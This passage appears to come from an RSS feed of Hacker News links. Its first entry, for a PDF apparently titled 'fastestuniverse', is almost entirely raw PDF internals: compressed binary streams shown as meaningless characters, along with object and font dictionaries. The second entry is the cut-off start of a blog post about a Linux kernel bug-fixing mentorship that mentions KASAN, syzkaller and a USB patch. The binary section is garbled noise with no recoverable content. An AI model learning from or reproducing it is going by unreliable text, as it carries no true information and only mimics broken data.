November 11, 2020 | http://people.idsia.ch/~juergen/fastestuniverse.pdf | <a href="https://web.archive.org/web/*/http://people.idsia.ch/~juergen/fastestuniverse.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>äÈhÓY2_Ê²é[leóŒ‚÷*LÊxäñÎãÉÇÃ€ÎdŽíâ¢Sü
çîl'8ú}GV³±¯z€„{@šÃRXÔBÊ€3´£\ˆÌŽ�e3ƒ9™úP%‘'»O]D?AlÈÿ’¹f§ˆˆY=³{’ÂJØEy†ó6Ëý`ï
lh&lt;ßt{àT_±ãE‘¦°
´"€ƒ„›Ú?ÚÂªz„ìÆFeÈ�èU#®#qR¢úLGÜùa¾Ø)
Ø‰FæÌ\$Änÿ©îE´šø÷ã£‰+4Ï‡Ð¬³¶A¨-ñÈ¹ëjà]�Ñ¦a!ïöùÁÏi8Q	0)�éeFxº„¼ì]‘ÌI+ôØ'_Ô)†Î!ùç"r’àÐÄ0ð0LèÝØ¼yà#RZbVý~&amp;6ÐA7Íäh6±Æ		¤Á.½ÞÊˆRÏ)º¥ÞŽT¶ÔN`=D�4C§EYª1»¹2¡CMð�¤bÜÁÁî85¡bìÅDl6e‘jì¼Ñ¼8¼èLBŒ7á~L˜²–¿ÊÝ‰Dé	K%†·&gt;¸K� ú
òŠ(DÈkXÉóÃ3„{…™ŽJ•Ý²!môSb4·!Æ˜´F‘èˆ×(|ˆ"Ë™N°&nbsp;üq68šÚõ…åm�,ïy@
°—Í
{‰ByG8Ñ'÷2ñv¼7Õ¨´Î¶*�}Îƒæ¡ùêY^aE0Ù5i°;$ÇDñ	x¼4çˆtCÇ=Ð0ß­›QÏ2Êš!~f£]ðÝ]˜8ë('&gt;=˜ßª`ûŒ*è[]–&amp;vWá„à]P,KèwäÙ¼‰44_È¹
&lt;¢W¼_ÕåÏÉÞ9¡ðESI=gF‘7õ]Õ»j¡onüÚì´/~žÓ&gt;Éé¹¦YqB/P2§ý0™Ñ¶5et­‹¦*y‘õqË®$ßp~Ò”Ã¢&gt;º@ËP¼™vÛ�$P&amp;YcWãBÙ‰žs§úÜ®é«–RY¹úAÝÁõ%ùåì‡–õô@3­ÙšÛ1oDÏì6 Eõ£…³
"‘aÛ–bnÖÖêžºHÙ‚Gqwnrm?uó®j�¸.BÎ‘h.ZžjÌö¾J ˜ÜN^ÊxÍ¤eÅëFj]%êö”x,Ó&amp;~Ý•ð¢n’Š‹DÍÄŒsáþªPæ|
�;�þ_
X;YJ{péZºi³;7¯½¥ú±š…SÎþEÿf‡¤M
Úµ‚tGt†´Cjõ«¼Þt™kÕ­Å¨œ®¼ÎTj}œêÞ{q6güJw±ðÂ9â"¯Ñ¼„cþÍ÷¾–\DóÜÚKÁû‰æ»6HÿÕqcokC{•_[R–�»¤¸ „«B7E°Žªù^íþ¡Od�Ÿ¹4îo\S�èªí*úÉ™öŠÅ+ &amp;æX(ã¢&amp;WF¿¦ÊtCUÄ‚,•4‘}'Õ8öÎ]åºGÁßÛW
’·Õ0¢Zx)3‹p£“2tÏú¬€Õ,Áö“öŠZ:)iøÍ”o–h¤åŒç˜î;­‚|ÇßYxXkÈˆÐôUßÈGo›€ä�ª÷hùÍ¢:Ûª«8™T•,ÍefR)…rä„¢”xI1E×˜‹—x8�VDFºªFòšo×:ë}Êt6Šî%óe¯†õãv‰ÐU,Y¦0��Âh·ŸñÿÜãcŽpx-ì¶èç%“ñ®ùÜ­ÆéÈ0OÄôD½8æm¡ÞN˜PÂXHBŽØ“«Ú‰a.û9fˆ�­‚N!!U:»7å‘-p†¸þ=Ñç&gt;¢r0JŠ·Ì’	2³!ÎAÃ‚úS@Ñ@€ªƒú½m&amp;f7/ŠE–`b7&lt;²û	]ô13	u‰E™Öð9/šË0ô*7ä«a¥^Ç8DÆìÖ
éÆpð)Œ¥ÆÍþ@
âýee­nû÷é"›±œïnövç}�
Äp¯¦�µbØaî´K1ií%rýõâ¿3dsÑ$?¡&nbsp;xïxœüXne~Û¾å�¥VôÌ
IÊy‰Òjôi'=è‚Ûš�Ø‹€a¾Z roÈñ©àjñÔÏM€ô18cËþ¸ÆÐñMãÕg�—!˜qµð.Ê½¦HÎÁ
�ÅáJŽ'ô=¹ iÛêÔë0p�+%…–7–w­ã¥p¨w·¼¢�åŽ”CSKtë¢-Rcyân"ª·Hõ0/Õ)Á7ÆvÙJUIz˜lYçŒ	hzÙèp&nbsp;^�&gt;©Ê‹!7ÙÕ¥é„îŸq†3�
$QKŽ4/ô&nbsp;LA�ís&gt;«[àKõz•Ü»ë.ÑácÏfÜÌT-¡¯£ª}R!�í^³ªÚäîð²]Zà-
ŒTïRñqøž@eZÏy±"‹i¦¤™Mª¬ª0¯j“‹
3œ*ò–4ÇÌ˜Vy½p—¾ÆÜ‚ÕògY|bˆ®“&gt;°iÉ[-Ç#áÇR-"BÙ2¡^¨Ÿ•Š�\Æj4Ãeì&amp;s1ñ)eS&lt;+‹’3$n¡öw1Rw}^¤xÐ¶&nbsp;œ4�}Ç=W�s¨›9ˆçj­ÙÏ"ùŽs¥lÄ:üø†1õld=Ä[�º˜�Òbg¥¶çL«ÉØÓÑ?Qè¡æÖª9ÖgŸGÒ¤Å˜óçç€Ð¡�¡3©OScÏBÞTT}ŠÇ8!Ì¯,NW#P�CÎ¹ú®/Ö€,(=ì6jørÍwúôÄ�|eÞ¬h°d^)›YY
´–^¿È=	j™ñáb
®Ù-�yçyu(�¨¬r;©êe·Ëj,ÆJ3´øÚdÚ÷�²Œ¥GŒm«ªý5‡q¹dµ9©-¦Í¹k�•¶§ñ„ž+ò–l6ý&lt;9MPwñRö¢yÆËTöp
K‹[ukbŠ¶�ê*4?Yqÿ$¢«’±1&gt;w"Ú‡SÝÃ±_np#ë½2î›"Õ®æj�ž½Žd¶”S¶ª¸ow!�êOPrRÐÑ$âÍ÷Ö<l}k&r>ù�dÑ24ïÎå’+Í;X-Š¥x—Ü�ñ¥jÓ¿îÏž”uC8)Öx�&nbsp;º•m3¾�WÉsRM8…û‰T‹2d¼¢¤àz‹‹ú¢ÚqÆ(g&nbsp;î“�úVË`¥É’ »6¯!=µ7Ò*„¤w"~¹„’e›8ybJ‚*6­÷ ½‡¹ùi“ƒüœ¹âLKÂ“]æ’EÅ¬À&nbsp;®([ÐïòöÈz_T™u¬�£2ø÷½þ|Ñ$ß‹¿_~\þ·Þ’[
endstream
endobj
4 0 obj
   3245
endobj
2 0 obj
&lt;&lt;
   /ExtGState &lt;&lt;
      /a0 &lt;&lt; /CA 1 /ca 1 &gt;&gt;
   &gt;&gt;
   /Font &lt;&lt;
      /f-0-0 5 0 R
      /f-1-0 6 0 R
      /f-2-0 7 0 R
      /f-3-0 8 0 R
      /f-4-0 9 0 R
      /f-5-0 10 0 R
      /f-6-0 11 0 R
      /f-7-0 12 0 R
      /f-8-0 13 0 R
   &gt;&gt;
&gt;&gt;
endobj
14 0 obj
&lt;&lt; /Type /Page
   /Parent 1 0 R
   /MediaBox [ 0 0 611.999983 791.999983 ]
   /Contents 3 0 R
   /Group &lt;&lt;
      /Type /Group
      /S /Transparency
      /CS /DeviceRGB
   &gt;&gt;
   /Resources 2 0 R
&gt;&gt;
endobj
16 0 obj
&lt;&lt; /Length 17 0 R
   /Filter /FlateDecode
&gt;&gt;
stream
xœ•ZÉŠ4Ç¾×SôL+÷†&gt;„Aàƒì~|è®žË ùà×w|±dfÍt[2BóWeeFFÆòÅ’ýëæNµ‡SñþôR»?ýö~úûé_4Šÿ~ûéôÝÕ�~ú÷ö§·­œ{��Çõ±»s-½÷z*C¥·xzûeûîãÅ½¸“?½}lß^�wáú«‹——˜Ó«K—ÿêò…þr•ñÝ•€·1±oîÊo×Ë?Þ~Ø|?·Ö#±òvÇ·Kh¯n¿D÷êîîÝ}]ï¼Ç*ˆ†�&gt;ù&lt;_?z�Y7úŽíé#Æ#;&gt;æWeÂ;3ðîo~÷z×ß}ðIŸuóà6¿¡Ÿk,Ùø
	`C¨ú�C$ÒÙ…�h“„Õ4Ybî"3qÇô¢ŒbƒïßTeýóÉ�Cï§ÿÐÀôÿÏÛ·Ð�;Ý7ïN9ýJzÁDü%…ŸIPÛþËÖÂ¹§~zñ¾œcÍ§_N6ÒÃ9÷ÿ&lt;ýíôãöœ@gçñ{#5Ÿ{XF~—)6IäÏéÿ£AÜ¶¶žcýÁƒØ¹›sçTã"‰J†žKøÃ¢ Ÿ8‡¸ŠÂFþð1&amp;cès?ñaeâ¬!~æcø;9z%WvBR}Ìç˜[ï…€¢žc½eõôfžÎŽNNþö3†»
Óüƒ££›³^b#·�äøÙW]£;97ÀàF&gt;›îç^x™;éãÂGníÜ›ë­(aAœ›#<swï. ¡’·Àubˆ¯ÄvxspïpƒèÍÝh6¹¢¼ß7ššÜn~"6��Ê;wÃ•ÈÑ÷»&¼r÷%t¥ÍÞë’‚œº¬Û7×vx="">‘aØÀŠâÞ‰ÝÚ‘a)æðl™çF´4n´yü´G&nbsp;ó¦ä/z@·‡N,AšŽÀ@‚=€YBDZCÀG¸ÆgyaZþ5&amp;…%ú	¯‰M²KÝmc¹à5“hy=íá»J�9Þ]Wñ`6tìô�•2ŽàÝ¦ëÉ vÖXæôSÐ(«bd™î5šPÐ(ÂnC×¹Ÿh-MÁDçœ†”IßIšbÊÞ,‹fBuEM¹ùÛå¥8õ‡�kX¾Ò+�8/˜)6Æ&nbsp;
¤ãð‘Œ�
áÚ‰mÚ¸&gt;Ö‚ÉÕÀ™�èK.I5ù�çê Ú‹BV„[up„ahO'¤sÈàsè&nbsp;L¹°mÑÛéXzåX)ë%jN:Wõ…4fß§&amp;yFŸ&amp;J4%¤yÙËñ'0^ÔX×ƒëºÈÉ&lt;ËP½_£(;§¢o¤XŸßŸØ;‰ôØ�ÉÖ™"†˜j…‰VFÞ0"x¡Ï"ÚB¢�NÍ&lt;ú
Ž×*}*—Y XSL•¶eaOOÅ1|\m?ÕÆG!&amp;
±ZÞÞØ¸N#+&amp;â!ü9	GšdÅ¡ƒp}$0.0õ¯	žÏñLÞRÜ¡è›zëŠ·eâ~¢CÐúx]
ÅÚ.Óút®µÏõ¼žÐ›jb¨ƒPè¿›Œ�);&lt;{+”l’Åç³ãÓn"·4T˜aúÞ'5À7Lñjw&nbsp;a¢ÎF­ˆ$IÊ
k¬åÒ^c€fÆ`3²Š¤ªØp=¿Cô/$K:~?ÂÍ7sÎèíÜû#ciÃ£šôÌK6v¼Ka7‰~æÑ!Å†¯È&lt;‰ÂD'ÁÅ'”žž…T²3$š)î2]OÀ˜á6ÅŒ+Þóâ+¢Bùê¥Ù%øêÍ¢ZïŒˆWŽÈ…(86Zò¡¢ÈåõåªR¢çÐ)ãeö»°ÒqXñP‘#½I¤É&gt;4V/GÐi7²ü.ˆ)òÞ¬òïMAQva&nbsp;8µGÁæ›Z¶ ±—°¥ç¹ž@ÿ)ùƒ]¾+x.éÅKâÀº±µ#úxÑ3¨“²š;¢&nbsp;˜;ÇCÑÏÅû
í¬C'úªÙJ´×UMI«à7&amp;Ó#�JÜóŽÁ!ñö%BŽ„"å½
&gt;ô	ƒ¾�ÿìÂŒ6¸ÂjãçKN²T¢«~N¸Í	Œ¢·Y&nbsp;.Ê¤p›*‘	tÞmÝ4¹Ýùoà¿2RŸ¤¹ÑQÚ¨²ötâ)ô¨Éþ°K~
ëñx
!O¹‹§óÈ�”�-òÕMŒÊ¨ˆeGo©²RxO9ùj¼ŒWd{‡ä+:ÿØRDjêd�‘{U(fc,Šü¢+ëL+Š,?B£”ý%ËŸaÃk‚Ú<k“iÐ"{¬€¹Éfº…É‡È5ò pb€mfëbØnŠñrÇ¼="" îŽÄ£p´q²Ú•)2£ø@b£•‚çê6�¤Ì@¡i<�ç"ûqz%Ù="">Ì4ë(z9ÃFsÓÌÖ()uƒ˜ò¿†˜gYFF!Â›&gt;É3ÈÅC†‹Ç^Ï5&amp;Øþ—&lt;ãª~ãŸdT—’‘mP¦rö”·*«ßH%£`o¶±XªloôMå*2U=r~yãñ‡\×jC˜ã
“óH%EfçõìNá\Õõ³7/-¤¨åáUÚcàE#¦¼‰Aqù„×+²ÍâxÄ]7«oÄøÝˆÑ¼@ÎÏOX†çð:™¦ó))«XZæ~
ûiøaKúrñZ�,F¶Ûœp	‹eûªxsÎ$ÿÅÁ$×JMK8tx;bÏ±2$êµu•­¬Ý,�À@å•õX£ÉcQÑUd»m¾¹«%
û0øÐxë$
ZNû3ÈYŠD\áŽ#cy’;�@Õ÷¤Å;?gÓšW­J2ÄOT¾�!‚óy†ñdÀ`´þª”ì×ÆèY‘ý¢}Š©ã»n­¢cSjME™7~ÜQaßwÙÊz*báAº+±²¥è¬ÐÇã
¨ÆÞÛÆWnHð :»æÉÜHp�qX2C	èŒ¬�Ù…²�‰«9ýj&amp;·‘®!w¶EÛîºª&nbsp;µœG\Ù‹M�þQ.�¯Þú1CßÆ‹Á—™‹Œ¨*˜¾?1š$É¸@6Ãà!ºÜÜÀB‰lê2ïÀke#�â7¥,-ó¡*ixX³ì�ÓÛ¤‰:7&gt;(=V}D†åÑ3uÓ�¥((%8ç€ñ)×wån6@ßÌ
ßgKè®ŒI¾©�•ç
‚
mð„À—
D.Ä©•��|µ‚JuÀs¤Óg2dã ‰èÇÆÂ�¾óîCVV EŒF˜©ÑùtÕ·àƒ”!�ŒÃÚ¿[¯ŒÂ¾¿Ž(ñ©
ÇßâÚ¾BÆlø�˜·}Š™Ü¬[½ziÞÍZÔÜ
­O3o®adIg‡ec–®_Ê[?2æt‰D¾YÿJÚ”j‚’®sSXKBeêE[ŠÏ²—oÂá.­Ú”›5xrÿ’”ƒ2îË‚ªÆf˜Ø­D21pXâ™Œžw[u&amp;—.É‰€Ü
"úØæ.\ÒáÉ�Ö÷ÒYÉÍàilb&nbsp;;r¢÷8»UF•
ÖË‚~Y�p"“„k×ªçN;Ù¤-#™%“à"Ž N&lt;|XÑC2&nbsp;”~@8‡Å¨;/¹ÃŠzñÆi…ÄçÆhÞ‚ÞM¾"ƒ2zë‘#±ewÜ‰é`=&nbsp;Ô÷9çØÙŒ3QªÏüì°ó@ZŽÂÀrv)$½L½KØûŸ¹ùñÍª
MÒT<h[Þg*à-ÜÑ9Òyq3Ô?n2®&ž�mŠ®¸‡93×Ñ«Ìvvu#;.¸ƒŠÐj…:ú!‰b¹&�yÛ\Çj·�ØÏ¸jß²”Ã3y–w-‡„ã¹Àfg¹Ù¥qbëã>ã¬dÒ±M›ÃòYQ¯&nbsp;õÌÕòÀ/'+ÅrúJlò`Pº­MöVæ#qÆ7R‰9¼k×9¦ä5Ñ”GAízó³¥©Ç­z~û½|Œ2î‘I)Þ¬×[MR—ŠãÄ�$ž[_.JÙÍ6"Úa›ùh=¤,Yš^ÁŒh¥¾ÔùÒMÈV�UX@£ªƒýSôRCÜ¾%r(ìnólk‰V5ÍÍ?h$³·‰•ø‘}[¦L¼hþˆù·%v!(ä¼ä¶:d²’D2´c”=(ÇûZ¾ÇÏ%&nbsp;IåÕâÁã'!_ª÷ðì–€&lt;óÜ_-øVHry®_o	Þõ^�üY!Øí@—7«$¤àNgŸBëéKP»y+{wDoü�ÃUî
}×*HK9«äóµs­¦9üñ“‚S(ÙB,.��Eãb}ÃuÓíÓ®LaIõ�m+‘™§Þò¦— [3ðM½ç\~´è‡~N'ñ)–×ðÁi?8
øk­ÅJR/fÜV°.*&gt;ÏÑo’åKôUï¸Hëz‡ß‚cõŒÐü1ÓÐ&amp;æ®Sµ�†äO��%Ñe›9ë•&nbsp;7,Ä‹¹ÂˆN’ÚKæ&amp;œAj�cHEMìfG…�Pâ¶ÿçIÑ--ÿçÝ•€ŸÍËcí]ó©ùwO#›Š’TûÛ8µ\»pÚäº'MÍl’;È2µÕ8¢½xë%®×/Æ]Pˆg&gt;ºÅ*E¦a¥†È]�-r\½Ã‘—Ÿ¬k\ÃÝÅ`ä.×Ùõ»Ü-oúÃŠxH@@»�Ì‡½ÛåX‹uy)L¢Ý°Ï�‹¼#u�û8yüä„(2¢bõ’‰cÐ~\°S&lt;åû¡}²‡òµO›‡,íž’3ÌqëÁ§{’ßÇEbéƒÑ¥£¬e¯&nbsp;‘%—ÓGþò�ðU•_Ù‰D©wöY4ý’fÙÛ7ñkÇ­gIRÇ,&nbsp;*~7:‡œÜ»šîçÊÈuŒ©ñ&amp;Œ=ëÈ/Œ§±z)Å«·íHsž¯¹vWd8âfY"¼#‹ó‡®«auF±™ëñ
üó˜&amp;kˆ”³½7ý_à«$¯+e¦±èNN(èE�&gt;e¾kòš �Y”†TòYB[µ³çFr§ò�.&lt;ÐptªaþY„i—Gí:UqW-ó—%K©&amp;¿V5âç�_ûPÐûícQî~šÝ'«ßpú=Ð&amp;�BP¹7Âi¶rO8”3u+t´xqó&gt;F{Åý×Ëêïß¶·ÿÖ±8œ
endstream
endobj
17 0 obj
   3732
endobj
15 0 obj
&lt;&lt;
   /ExtGState &lt;&lt;
      /a0 &lt;&lt; /CA 1 /ca 1 &gt;&gt;
   &gt;&gt;
   /Font &lt;&lt;
      /f-0-0 5 0 R
      /f-8-0 13 0 R
      /f-9-0 18 0 R
      /f-2-0 7 0 R
      /f-1-0 6 0 R
      /f-6-0 11 0 R
      /f-10-0 19 0 R
      /f-7-0 12 0 R
   &gt;&gt;
&gt;&gt;
endobj
20 0 obj
&lt;&lt; /Type /Page
   /Parent 1 0 R
   /MediaBox [ 0 0 611.999983 791.999983 ]
   /Contents 16 0 R
   /Group &lt;&lt;
      /Type /Group
      /S /Transparency
      /CS /DeviceRGB
   &gt;&gt;
   /Resources 15 0 R
&gt;&gt;
endobj
22 0 obj
&lt;&lt; /Length 23 0 R
   /Filter /FlateDecode
&gt;&gt;
stream
xœ•ZÉ®+Ç
Ý÷WèÔ®y-dáäY^H-É€°³Èï‡‡d
­áù†ïkU×Àb‘‡‡¬þ}1‡\Ý!Y{8æjÜÿ&lt;ü›Zñß¿¾»˜Ã/ÿY¾ÿ²¤µf_¸]«YsªµæCÊhJµøÃ—ß–ïGs4{øòX~:kÜÙÕ“ñç£�ádÂùhO&amp;žéOjM&amp;scA#Þ›äð«w¬‹¹ð¯Ëùç/?,¶®¥TO¢|¹a‰ëÙ•“ÙÎÞœÌÍÜÍCæµÆZŒ²Žæ°ÞÇÏÄ�V{æ…Þcyz‰v�ÇŠ—ñd/&lt;ñÆÜíÕnV÷boúïÝ:ôYwfáFÈëêš}ŠM^g¡1dV»Ñ£ó4u4ÎZÄ;5‘X:ÏBÜÐ=©&nbsp;Xà/_ôÈþþ×ƒY]­‡ÿRÃôÿ¯ËO?S“9Ük;üNç‚ŽøK¾ÒùáØ¶ß–âÖêáhmZ}Ž‡ß­¥º5�ôÿ:üãðãòy‚èVcMàüêk¡	r\«›Zþt:Ø¸Ÿ"¿†ÿo’¶”y½é7Òö]ŒYCö“&amp;2zLî›UA&gt;±:?«¢µ|ó6†½é›¥€ŸX7‹ufçŸåèþNŽžÉ•�L©�ÎDšÇÖ(òê�«%ª§×ÉÓo&amp;’+}!—¾Ÿ¹ð.ˆ6«Îè‹'{†ƒŠ1óoFø&amp;F’cZm2i±™Ý_üØd[Ø)1èrvédiêèù_ÈS7[¨ÓÍ\Íf�¹ZÃÞAb–!æùXJ0‚K7èR×šèx°i}´&gt;®&gt;–ZÓ!–²ÖbjIºi7múB»÷$y€h¤Ú¬ š«gönj¬'ÕC2y8~4@êÆoRV"ï–î7ÚD0üÊ…K@V_$tì&amp;(ý¥y	�ð&amp;bëËx´óì‘VÊô°þf£g€1f˜0«€v1éÜ&amp;J€&gt;˜qF•Ð{3w†T€ÝÐ{(Õ�ŒHŸ|´Ý@gr„¾Œ½`†àéø/uÑ_V±&gt;±šw
;„ÅxÚ¢mLRixÙpù$ÚÄpš/a:&amp;‰IqèX½öLX°Þ‰%ËÉÉ$�Ã‘ä9�~½È]êô“¸iÁó&amp;ž—s—¡)R¾išâ£dùoÒq”L6¹JßšYçÙ¬¹ÓFÖŸÉlRëâ^»À6ƒ“M¡…|
f#v¼é;+š„¹rRCL™Æ­°˜
O‚c“-›éaXiî¾¾Á`sÛ%ìî½õm:AxÕœºåãuŒ7¤XUÌ‹Ý‘âš9»õUEÅ7õ¢£Ïôë:Ôàsç ?mû—w±1¼ÌJ´ÚÁÀœyÆ­û}4ì«Y&lt;Ž1â¾2+ïÊJo+²	°ƒ­%+ö¤vž@°ËùË¯o°Ë"&amp;
ˆÑ¬Ö¥1|2Ó=VÆJ
¼01ió™}Å³V«@›	Þ0Ëic²ZïÑŠG6¾¸{ÀAüIfMCRh�žæUÁ¨*qzU�óˆá´5O±Œh5oUs%e×÷Êq!SäË&lt;ƒÏ«Íñ­v`øl]$,l»	îï,YXCpÄïG"W�ô
6}¢&nbsp;B«šÃ®õ'ØCUÌ˜«Y…cŸa¦k™ÅRTªMº¸g

Ü5‹‚\¢.ïµDŠ'ª*±…¯i)
í¦Ð´o5EˆµÚêy–¯iªÒŽèÌxÍ"hŠS	/À¶ÁÔh�9%Œ)trz`)dsÁàákŒÈ°&amp;í
)Z�yhV'×–Êàs™fævŽº
.Uuê[&lt;È'6Ê]8“Q×Ž´Ÿª“2y�
èÞW[dƒ»�öŸÚ©72
–ADq]ÐKã®÷��£¼e ãq
ZòÖR!íjaÚŽ£$¶µC÷;[×ð|ÈV²ž‚aÖP•}a¿É´5‰ÍðqºDÔ�2—w�Ê[,dïB2DJ²Dñ‚‡Ä–·QÑêö€²–´0x°’"„I�µ�™÷h°Ú4‰’|‘»;ÉÉ-ä°qÈlùÁÓŽlX£+Ùg$Y¦ÔÂrQæÿ! °)g	ã-I(·´´x•%ÓI#4?;Š
¦È^H-üÂ1.ô”]ˆöGÜßu�6Gd‚öâö6Å5^«Šu)µdï¤}øä²Í/ˆ=•S_ŽÀ@%«€…‘0Lbƒl¶¢±Î1Z&lt; ¦Ž&nbsp;üÌHÁnzÕ‰–˜äzVŠLóó)&gt;R&amp;D¦†ø˜›ÒÕWxs¤½÷ñ‘%‚2žh~ªcü¤Z÷€DëÉúÅõžŒ?Îéc§Ò�„ñ?á‚°'RˆU4ç}‡Ž@4$¶pjËŒgó—ÐÈY+®ž‚íhi¡P
Ð‘=*õ„d¾+ÑŸ¤‚,¢i«t+Jš@B~ˆ¾”S8¯Õ%¡ÆûŠÿ@L\%Ë³EÆS ·ù­â›jPˆ¥ÛÏ”
a—�²`Ç.¤kQÏÁ Öf[Ì·
~Eû”©Ç˜rxAiÅå]²5	¥nš/+í3æ6Ê£x:;Í~0Ù‰‡ƒifã½Þ°ºÜ­n1Ú¡Ç
©�dé)ÓH$w¿³æâ�”Å&lt;(k§9áY-wâ‘v�d–ö=C¯\&gt;sedÅqÉàÚ5 ¦ï5Ìz�nè|ÓÈÖ%“7dœd´[W+
»Éˆ¾‹–J*·ì9ç•‚."éÙ]ùÂdåÔ]ˆç¡óC1I¬DÞ™h¨ÏU¤BKº«æ5t·óí*èé9Á­-ÁÝæLì¹$PÔ¨-–±r
QÔj÷t�y#CÉšßÍ
BÍxÂë2å…h]õbÂ˜±¿¼KdmÒ\ºÊZûÈ	)ƒ {¶9A–íþ)_º67Ò&nbsp;NB£†z¶:k“±Ðõš�m€Có;¢«ÎT
Ø�)!¬r©Š±ÑCúó&nbsp;ˆž›ê•#pŸØkÇFTïÔÅ‹–-ˆó OB%:‰
LdrNªïÖYä9â³°Þ¥H6ÄÒú’_T&nbsp;8§¤Ñ
yu
»up&nbsp;s+�¤�³tX­YìXF±“rïÕ¦€»œÓ%Ñií945”»1’UfkJý;EèÓµàŠòPj‰ílGœeÉÄêýÒgiu(¥š¯%'²@Î7:†xOXqéÌ…ÍM(tÙó_8¢7�ò¢º›Ž!.Dÿo3Ëˆ-_ï¦Q—_³RÌF'¦,º6z¤^g)ÍD1»›ôSø[)�cs¨h)&lt;\Üo.2íËq?[¼»qI,²v;âw­.4Êeœ.�=y&nbsp;ÅˆèíýÀ&nbsp;¾PoÂY“·�XLp�&lt;„�,êåÛ8gË¯×@[^¬P\{xÂÐ©·ÌçxÉbH
KhïUD½Ì@´Ëf/Àdá^Íx"&amp;´Ä–v…ßÍŒÞyàÒ:IjÇÀŒ!(ÎVŽ�Å¦[WØ’+^¸ú›è`n‹Ô�&amp;øçi':“w9¦L&lt;¶[Qu™Wà3‰û  ;ì(ÿÙðØìn\é±jN÷s“NËÍÖ�2åŠ\qõ¦L¥¼)Ÿ•4Ãä)Œð¯†~4ŽrR?�wÍ}f Ù…ŠÅ}Ì&gt;±YK9å!u
Ä kxWœûPU¡ÌkMD�1&lt;®…¢N&gt;ç–S"SöFÉ
õÉrd�¼/TÛ’hÏsñþÂî-5·[(Ú¾Öd8OF­©¥f^ò†ÛûB3êw…z}(2ãµˆÌÇ³«ûqÍÙ0ò]8Ô•§r�oÈºölŠ	¤«=]™~TŽýIXMêùjHm¾[:DTn8Ü%‚Öí'riå/ì&gt;s„ëœ‘)Hæ‚ÞÁM�S9—Ü		¯‹T`{MÌ»0˜òžÉÁ%»˜(¿µñ^AbÑ5&amp;ö7_›Œ[„)ƒòßu-™p:�¹–¿ôÚuçR(­ÛŒ¦gd•ðùKi-�Õz4‘žûsPÆí(ç”O…Öo‘ŽþäÔÄ‹f2žb`Qõþ©¤ßÔµçuqÎyéïOAw÷{±LÑ•mNäôø)…</h[þg*à-üñ9òyq3ô?n2®&ž�mš®¸‡93×ñ«ìvvu#;.¸ƒšðj…:ú!‰b¹&�yû\çj·�øï¸jß²”ã3y–w-‡„ã¹àfg¹ù¥qbëã></k“ið"{¬€¹éfº…é‡è5ò></swï.></l}k&r></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://people.idsia.ch/~juergen/fastestuniverse.pdf">http://people.idsia.ch/~juergen/fastestuniverse.pdf</a></em></p>]]>
            </description>
            <link>http://people.idsia.ch/~juergen/fastestuniverse.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25065400</guid>
            <pubDate>Thu, 12 Nov 2020 01:37:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Linux Kernel Bug Fixing Mentorship]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25065177">thread link</a>) | @simonpure
<br/>
November 11, 2020 | https://himadripandya.me/post/634481719919165440/linux-kernel-bug-fixing-mentorship | <a href="https://web.archive.org/web/*/https://himadripandya.me/post/634481719919165440/linux-kernel-bug-fixing-mentorship">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="634481719919165440">
                    
                        
                            <h3><a href="https://himadripandya.me/post/634481719919165440/linux-kernel-bug-fixing-mentorship">Linux Kernel Bug Fixing Mentorship</a></h3>
                        <p>I recently finished a three months long <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fmentorship.lfx.linuxfoundation.org%2F&amp;t=ZDI2M2RjNjY5ZjRkODlkZDlkMGQwMWUxMjk2MzEwZTIzYjgzY2EyZCxxZFY2MWdBcQ%3D%3D&amp;b=t%3ADI8NpTL_CjWnBvVuPh5VJg&amp;p=https%3A%2F%2Fhimadripandya.me%2Fpost%2F634481719919165440%2Flinux-kernel-bug-fixing-mentorship&amp;m=1&amp;ts=1605443209" target="_blank">CommunityBridge(now knows as LFX)</a> mentorship with <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.linuxfoundation.org%2F&amp;t=YTcyZTgzN2M0YTJiN2UxNWRkOGFlNzhhNWExNTVhMzFkOTU0YzdlYSxxZFY2MWdBcQ%3D%3D&amp;b=t%3ADI8NpTL_CjWnBvVuPh5VJg&amp;p=https%3A%2F%2Fhimadripandya.me%2Fpost%2F634481719919165440%2Flinux-kernel-bug-fixing-mentorship&amp;m=1&amp;ts=1605443209" target="_blank">The Linux Foundation</a>. I worked as a <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fmentorship.lfx.linuxfoundation.org%2Fproject%2Ff06db0d5-537e-4e0f-8ca4-0a471f95a04d&amp;t=Y2E1Nzk0ZTlkZGNjYjJhZjE1ZjRiMTQxZjVmZjZjODk2NWQ2N2MxYixxZFY2MWdBcQ%3D%3D&amp;b=t%3ADI8NpTL_CjWnBvVuPh5VJg&amp;p=https%3A%2F%2Fhimadripandya.me%2Fpost%2F634481719919165440%2Flinux-kernel-bug-fixing-mentorship&amp;m=1&amp;ts=1605443209" target="_blank">Linux kernel bug fixing</a> mentee under <a href="https://t.umblr.com/redirect?z=http%3A%2F%2Fwww.kroah.com%2Flog%2Fabout.html&amp;t=ODhkMDExOGJlYTE3MTI2ZDJiZjU5ZGFkNTZjNGUyMzcxNmQ1M2VkNyxxZFY2MWdBcQ%3D%3D&amp;b=t%3ADI8NpTL_CjWnBvVuPh5VJg&amp;p=https%3A%2F%2Fhimadripandya.me%2Fpost%2F634481719919165440%2Flinux-kernel-bug-fixing-mentorship&amp;m=1&amp;ts=1605443209" target="_blank">Greg Kroah-Hartman</a>. This post is about my experience and work during the mentorship program.</p><p>In
the first week of the mentorship program, I learned about debugging
techniques for the Linux kernel, how to use decode_stacktrace.sh, and
what is CONFIG_KASAN. These were all unfamiliar concepts for me, and
I found the mentors’ learning resources very useful. My first task
was to write summaries of my understanding of these concepts. I found
these summaries quite helpful while fixing real bugs in the kernel
later in the mentorship.</p><p>I
was also unfamiliar with syzkaller and syzbot before becoming part of
the mentorship. So after completing the summary tasks, I spent the
next few days getting familiar with these tools. The syzbot dashboard
has hundreds of reported bugs, and I found it a little challenging to
decide which one I should pick first.</p><p>In
the meantime, my mentor, Greg KH, redirected me towards an ongoing
discussion regarding a bug produced due to a short read in
usb_control_msg() call. There existed a few ways to fix it, and after
discussing them with the mentor, I proposed a fix. The patch
generated a fair amount of discussion, and I also received comments
